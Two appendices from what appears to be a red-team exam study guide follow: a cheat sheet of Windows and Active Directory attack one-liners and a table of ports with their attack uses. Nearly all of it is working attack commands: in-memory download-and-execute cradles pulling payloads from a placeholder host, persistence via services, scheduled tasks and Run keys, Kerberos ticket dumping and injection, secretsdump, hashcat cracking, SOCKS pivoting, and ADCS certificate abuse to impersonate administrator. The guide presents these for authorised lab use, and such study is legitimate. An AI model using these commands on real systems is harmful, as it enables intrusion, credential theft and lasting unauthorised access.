## Appendix C — One-liners

> All of these are for authorized lab/exam use. Prefer `run`/`execute-assembly` over `shell`, and never on a restricted host unless the technique is the point.

### C.1 Download and execute

```powershell
# PowerShell in-memory download
IEX (New-Object Net.WebClient).DownloadString('http://<host>/payload.ps1')
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<host>/payload'))"
```

```text
# certutil (LOLBAS)
certutil -urlcache -split -f http://<host>/payload.exe C:\Windows\Temp\payload.exe
```

```text
# bitsadmin
bitsadmin /transfer job /download /priority high http://<host>/payload.exe C:\Windows\Temp\payload.exe
```

### C.2 Encode / decode

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<b64>'))
```

```bash
echo -n 'whoami' | base64
echo '<b64>' | base64 -d
```

### C.3 Discovery

```text
# Local admin group members
net localgroup administrators
Get-LocalGroupMember -Group Administrators

# Domain admins (PowerView)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberName

# Who is logged on where (noisy)
Invoke-UserHunter -CheckAccess
Find-DomainUserLocation

# Open shares
Invoke-ShareFinder -Verbose

# Password policy (before spraying)
Get-DomainPolicy
net accounts /domain
```

### C.4 Services and tasks

```text
sc qc <service>
sc config <service> binPath= "C:\Windows\Temp\payload.exe"
sc start <service>
sc stop <service>
sc delete <service>

schtasks /create /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /run /tn "Updater"
schtasks /delete /tn "Updater" /f
```

### C.5 Registry

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\updater.exe" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f
```

### C.6 Networking

```text
netstat -anop tcp
net use \\<host>\c$
net view \\<host>
net view /domain:<domain>
Test-NetConnection <host> -Port 445
portscan <host> 445,5985,3389
```

```bash
ssh -D 1080 <user>@<host>
ssh -L 8080:<target>:80 <user>@<host>
ssh -R 8080:localhost:80 <user>@<host>
proxychains4 <tool>
```

### C.7 Kerberos and tickets

```text
klist
klist purge
Rubeus.exe triage
Rubeus.exe dump /luid:0x<id> /nowrap
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe asktgt /user:<u> /aes256:<key> /domain:<d> /dc:<dc> /opsec /nowrap
```

### C.8 SID and name conversion

```powershell
ConvertFrom-SID S-1-5-21-...-512
ConvertTo-SID DOMAIN\user
([System.Security.Principal.NTAccount]"DOMAIN\user").Translate([System.Security.Principal.SecurityIdentifier]).Value
```

### C.9 Cracking

```bash
hashcat -m 1000  ntlm.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 2100  dcc2.txt rockyou.txt
hashcat -m 5600  netntlmv2.txt rockyou.txt
john --format=NT ntlm.txt
```

### C.10 Pivoting

```bash
# proxychains config
# [ProxyList]
# socks5 127.0.0.1 1080

proxychains4 nxc smb <target> -u <user> -p <pass>
proxychains4 impacket-secretsdump <domain>/<user>:<pass>@<target>
```

```text
# Chisel
# Server (operator): chisel server --reverse --port 8080
# Client (target):   chisel client <operator>:8080 R:socks
```

### C.11 ADCS

```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
certipy req -u <user>@<domain> -p <pass> -ca <ca-host>\<ca-name> -template <t> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc>
```

```text
Certify.exe find /vulnerable
Certify.exe request /ca:<ca>\<name> /template:<t> /altname:<domain>\Administrator
```

### C.12 Trusts

```text
nltest /domain_trusts /all_trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainForeignGroupMember -Domain <trusted>
```

---

## Appendix D — Ports, services, and protocols

| Port | Service | Use in an exam |
|---|---|---|
| 53 | DNS | Enumeration; DNS beacon |
| 80 | HTTP | Egress, ADCS web enrolment |
| 88 | Kerberos | TGT/TGS, Kerberoast |
| 135 | MSRPC | WMI, DCOM, RPC |
| 137–139 | NetBIOS | Legacy SMB |
| 389 | LDAP | AD queries |
| 443 | HTTPS | Egress, ADCS |
| 445 | SMB | Shares, PsExec, SMB beacons |
| 464 | kpasswd | Password changes |
| 593 | RPC over HTTP | Exchange/AD |
| 636 | LDAPS | AD queries |
| 1433 | MSSQL | SQL attacks |
| 3268/3269 | Global Catalog | Forest-wide LDAP |
| 3389 | RDP | Interactive access |
| 5985/5986 | WinRM | WinRM lateral movement |
| 9389 | AD Web Services | ADWS |
| 47001 | WinRM | WinRM |
| 49152–65535 | Dynamic RPC | DCOM/WMI pivoting |

**Protocol notes**
- **Kerberos requires FQDN**, not IP. Use `cifs/<host-fqdn>`.
- **SMB signing** may block some relay/tamper paths.
- **WinRM** requires admin or `Remote Management Users`.
- **LDAP** queries are cheap; session enumeration over SMB is not.
- **ADCS web enrolment** is HTTP/HTTPS; ESC8 relays NTLM there.

